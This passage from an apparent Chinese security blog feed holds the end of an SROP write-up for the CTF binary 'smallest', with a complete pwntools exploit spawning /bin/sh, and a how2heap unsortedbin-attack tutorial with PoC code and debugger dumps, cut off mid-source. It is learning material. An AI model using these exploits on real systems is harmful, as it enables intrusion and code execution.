19.35.08.png"><br>泄露出 stack 地址之后，我们开始布置 read 函数方便之后读入 shellcode；到现在为止，程序仍会跳到 start 函数开头开始执行（包括 xor rax,rax），执行之后 rax==0 之后会执行 read(0,$rsp,0x400)向 stack 中读入以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame1=SigreturnFrame()</span><br><span class="line">frame1.rax=constants.SYS_read</span><br><span class="line">frame1.rdi=<span class="number">0x0</span>               <span class="comment">#arguments1</span></span><br><span class="line">frame1.rsi=leak_stack_addr   <span class="comment">#arguments2</span></span><br><span class="line">frame1.rdx=<span class="number">0x400</span>             <span class="comment">#arguments3</span></span><br><span class="line">                             <span class="comment">#read(0,leak_stack_addr,0x400)</span></span><br><span class="line">frame1.rsp=leak_stack_addr</span><br><span class="line">frame1.rip=syscall_addr</span><br><span class="line">payload3=p64(start_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="built_in">str</span>(frame1)</span><br><span class="line">p.send(payload3)</span><br></pre></td></tr></table></figure><p>读入之前：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623077170540-44847019-f532-4309-988f-cc783befa67b.png#height=1638&id=u4f52b266&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-07%2022.46.05.png&originHeight=1638&originWidth=2748&originalType=binary%E2%88%B6=1&size=279017&status=done&style=none&width=2748" alt="截屏2021-06-07 22.46.05.png"><br>读入之后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623077208385-973d312a-1896-4e03-a43c-719927906121.png#height=1640&id=u1804f993&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-07%2022.46.44.png&originHeight=1640&originWidth=2754&originalType=binary%E2%88%B6=1&size=246951&status=done&style=none&width=2754" alt="截屏2021-06-07 22.46.44.png"><br>仔细看上下图，这里的读入可是覆盖了其他的内存地址中的内容，注意这里读入的地方为 0x7fffffffdfa8。另外在 payload3 中 payload3=p64(start_addr)+’a’*8+str(frame1)的 p64(start_addr)必须写上，因为 read 之后原有的栈情况不再存在需要重新布置，如下所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623078198730-3fee9ed8-333f-4cd2-b8cf-21407815b91d.png#height=1638&id=ue504fafd&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-07%2023.03.13.png&originHeight=1638&originWidth=2750&originalType=binary%E2%88%B6=1&size=252291&status=done&style=none&width=2750" alt="截屏2021-06-07 23.03.13.png"><br>这里的’a’*8 的作用先按下不表，布置好 frame1 之后因为 payload3 中写的是 p64(start_addr)，因此 retn 后 pop rip 会执行 xor rax,rax 清空 rax 进而调用 read：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623078874821-94f81295-89d0-47b8-b159-1b3a3f8a76a0.png#height=1512&id=u5d049b8b&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-07%2023.14.28.png&originHeight=1512&originWidth=1444&originalType=binary%E2%88%B6=1&size=160438&status=done&style=none&width=1444" alt="截屏2021-06-07 23.14.28.png"><br>由于我们要 syscall rt_sigreturn，因此这次 read 的长度要为 15，发送方式为 send：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sigreturn = p64(syscall_addr)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span> <span class="comment">#len(sigreturn)==15</span></span><br><span class="line">p.send(sigreturn)                   <span class="comment">#len(sigreturn)==15 to syscall sigreturn next</span></span><br></pre></td></tr></table></figure><p>在读入 sigreturn 后 rax==15，此时的 stack 状况如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623153914931-d6005272-edad-4318-8e69-9c4f04b76076.png#height=750&id=BLhNH&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%2020.05.06.png&originHeight=750&originWidth=2730&originalType=binary%E2%88%B6=1&size=156090&status=done&style=none&width=2730" alt="截屏2021-06-08 20.05.06.png"></p><blockquote><p>为什么上图要用表格的形式来呈现？因为 gdb 下断点断不下来，而且就算断下来之后这次的 read 是将之后的 payload 一并读入会导致此篇文章不够清晰，所以采取了这种方式。</p></blockquote><p>然后程序会执行 retn 即 pop rip，程序流跳转到 syscall：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623154527060-0afc8880-a1bf-4207-afdf-bafe3eab477b.png#height=786&id=kQSIp&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%2020.15.17.png&originHeight=786&originWidth=2592&originalType=binary%E2%88%B6=1&size=146374&status=done&style=none&width=2592" alt="截屏2021-06-08 20.15.17.png"><br>这次的 syscall 调用 rt_sigreturn 对寄存器进行设置，设置完毕后 rip 还会指向 syscall 调用 read 读入 payload5，此时的 stack 状况如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623154683998-6a134227-ee4d-46b4-8b84-0b9361d35635.png#height=948&id=PrkjT&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%2020.17.54.png&originHeight=948&originWidth=2500&originalType=binary%E2%88%B6=1&size=240264&status=done&style=none&width=2500" alt="截屏2021-06-08 20.17.54.png"><br>再补充一点之前的’aaaaaaaa’的作用，’aaaaaaaa’的作用其实就是方便以后布置栈上的情况的，避免让 sigframe 受到影响：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623155091845-11766000-70d5-421a-82f5-5a24aa3e4119.png#height=1228&id=EC5jt&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%2020.24.39.png&originHeight=1228&originWidth=2682&originalType=binary%E2%88%B6=1&size=247495&status=done&style=none&width=2682" alt="截屏2021-06-08 20.24.39.png"><br>言归正传，最后 retn 时 pop rip，rip==start_addr，xor 后 rax==0，会 read sigreturn 控制 rax==15，从而触发 rt_sigreturn 执行 execve。<br>嗯，思路的确是简单，但是这里要考虑有关”/bin/sh\x00”的写入问题，在之前的图中可以知道我们需要向寄存器 rdi 中写入”/bin/sh\x00”的地址，但是程序中并没有”/bin/sh\x00”，但是我们可以向 stack 中写入”/bin/sh\x00”并把这个地址提前写入 rdi 中即可：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623157529910-f08e68af-913b-42df-b956-7b9dce1047ce.png#height=366&id=xFJYj&margin=%5Bobject%20Object%5D&name=QQ20210608-210504%402x.png&originHeight=366&originWidth=2508&originalType=binary%E2%88%B6=1&size=127157&status=done&style=none&width=2508" alt="QQ20210608-210504@2x.png"></p><blockquote><p>先确定要写入的地址，将这个地址设置为 frame2 的 rdi，然后 read “/bin/sh\x00”。</p></blockquote><p>完整 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall_addr=<span class="number">0x4000BE</span></span><br><span class="line">start_addr=<span class="number">0x4000B0</span></span><br><span class="line">skip_xor_addr=<span class="number">0x4000B3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4000c0&#x27;)</span></span><br><span class="line">payload1=p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2=<span class="string">&#x27;\xb3&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">leak_stack_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_stack_addr)   <span class="comment">#leak_stack==0x7fffffffe20a</span></span><br><span class="line"></span><br><span class="line">frame1=SigreturnFrame()</span><br><span class="line">frame1.rax=constants.SYS_read</span><br><span class="line">frame1.rdi=<span class="number">0x0</span>               <span class="comment">#arguments1</span></span><br><span class="line">frame1.rsi=leak_stack_addr   <span class="comment">#arguments2</span></span><br><span class="line">frame1.rdx=<span class="number">0x400</span>             <span class="comment">#arguments3</span></span><br><span class="line">                             <span class="comment">#read(0,leak_stack_addr,0x400)</span></span><br><span class="line">frame1.rsp=leak_stack_addr</span><br><span class="line">frame1.rip=syscall_addr</span><br><span class="line">payload3=p64(start_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="built_in">str</span>(frame1)</span><br><span class="line">p.send(payload3)             <span class="comment">#syscall read to read payload3 to stack</span></span><br><span class="line"></span><br><span class="line">sigreturn = p64(syscall_addr)+<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.send(sigreturn)            <span class="comment">#len(sigreturn)==15 to syscall sigreturn next</span></span><br><span class="line"></span><br><span class="line">frame2=SigreturnFrame()</span><br><span class="line">frame2.rax=constants.SYS_execve</span><br><span class="line">frame2.rdi=leak_stack_addr+<span class="number">0x300</span> <span class="comment">#arguments1</span></span><br><span class="line">frame2.rsi=<span class="number">0x0</span>                   <span class="comment">#arguments2</span></span><br><span class="line">frame2.rdx=<span class="number">0x0</span>                   <span class="comment">#arguments3</span></span><br><span class="line">frame2.rip=syscall_addr</span><br><span class="line">payload4=p64(start_addr)+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+<span class="built_in">str</span>(frame2)</span><br><span class="line">payload5=payload4+(<span class="number">0x300</span>-<span class="built_in">len</span>(payload4))*<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload5)</span><br><span class="line"></span><br><span class="line">p.send(sigreturn)</span><br><span class="line">p.sendline(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1623157785716-d84d52c4-3f2b-497c-8a8b-25e44ccdfa7e.png#height=1800&id=ayfcY&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-08%2021.09.26.png&originHeight=1800&originWidth=2880&originalType=binary%E2%88%B6=1&size=385901&status=done&style=none&width=2880" alt="截屏2021-06-08 21.09.26.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>注意，SROP 的栈布置：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1622455069201-ac27ea29-768e-4c3c-8ac8-1f40f035bac6.png#height=541&id=WJ9bJ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=672&originWidth=691&originalType=binary%E2%88%B6=1&size=159321&status=done&style=none&width=556" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(14)-unsortedbin attack</title>
    <link href="https://cyberangel.cn/2021/05/18/how2heap(14)-unsortedbin%20attack/"/>
    <id>https://cyberangel.cn/2021/05/18/how2heap(14)-unsortedbin%20attack/</id>
    <published>2021-05-18T07:48:53.000Z</published>
    <updated>2021-07-04T09:57:11.681Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一小节我们重新来看一下 unsortedbin attack，这个作用是想某个地址中写入超大值，除了这一点，<strong>我们可以向 global_max_fast 写入一个超大值，从而使用 fastbin attack 进行攻击。</strong></p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>glibc &lt;= version 2.27（不清楚 glibc 2.28 是否修复，懒得看了）</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique only works with buffers not going into tcache, either because the tcache-option for &quot;</span></span><br><span class="line">    <span class="string">&quot;glibc was disabled, or because the buffers are bigger than 0x408 bytes. See build_glibc.sh for build &quot;</span></span><br><span class="line">    <span class="string">&quot;instructions.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">assert(stack_var != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="POC-分析"><a href="#POC-分析" class="headerlink" title="POC 分析"></a>POC 分析</h2><p>在 POC 的开头打印出了我们需要控制的地址：stack_var（b 17-&gt;r）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line">#Let<span class="number">&#x27;</span>s first look at the target we want to rewrite on <span class="built_in">stack</span>:</span><br><span class="line">#<span class="number">0x7fffffffddc8</span>: <span class="number">0</span></span><br></pre></td></tr></table></figure><p>stack_var 的内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx &amp;stack_var</span><br><span class="line"><span class="number">0x7fffffffddc8</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffffffdec0</span></span><br><span class="line"><span class="number">0x7fffffffddd8</span>:<span class="number">0x76f1b24f6509d200</span><span class="number">0x0000555555554a60</span></span><br><span class="line"><span class="number">0x7fffffffdde8</span>:<span class="number">0x00007ffff7a03bf7</span><span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x7fffffffddf8</span>:<span class="number">0x00007fffffffdec8</span><span class="number">0x000000010000c000</span></span><br><span class="line"><span class="number">0x7fffffffde08</span>:<span class="number">0x000055555555481a</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde18</span>:<span class="number">0x442287353d921ff8</span><span class="number">0x0000555555554710</span></span><br><span class="line"><span class="number">0x7fffffffde28</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffde38</span>:<span class="number">0x0000000000000000</span><span class="number">0x1177d26012b21ff8</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来我们创建两个堆块，其中第一个堆块当作我们的 victim，第二个堆块是为了防止第一个堆块 free 后与 top_chunk 合并，可以遇见的是在 free 掉 victim 堆块之后它会进入到 unsortedbin 中；另外第一个堆块的大小不能属于 tcachebin 和 smallbin（b 24-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">          <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcachebin</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span> #chunk_victim</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757670</span>:<span class="number">0x0000000000000420</span><span class="number">0x0000000000000200</span> <span class="meta">#chunk--avoid top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757870</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020791</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621325134515-b681e9d2-d666-493f-9a1d-df4fa983879a.png#align=left&display=inline&height=670&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2016.05.28.png&originHeight=670&originWidth=2748&size=87153&status=done&style=none&width=2748" alt="截屏2021-05-18 16.05.28.png"><br>假如现在有堆溢出或 UAF 漏洞可以修改 chunk_victim 的 bk 指针到之前的 stack_var（你没看错，又是 bk 指针）（b 35-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcachebin</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000421</span> #chunk_victim</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007fffffffddb8</span></span><br><span class="line">       #stack_var</span><br><span class="line">       #<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757670</span>:<span class="number">0x0000000000000420</span><span class="number">0x0000000000000200</span> <span class="meta">#chunk--avoid top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757870</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020791</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621325405363-407ac8e7-529b-4c9c-854e-9450fa18d7bd.png#align=left&display=inline&height=748&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2016.09.59.png&originHeight=748&originWidth=2754&size=104811&status=done&style=none&width=2754" alt="截屏2021-05-18 16.09.59.png"><br>接下来是重点，我们将把 chunk_victim 从 unsortedbin 中申请出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br></pre></td></tr></table></figure><p>这里选择引入源码调试，重点 malloc 源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">//victim==0x555555757250</span></span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk; <span class="comment">//bck==0x7fffffffddb8</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (chunksize_nomask 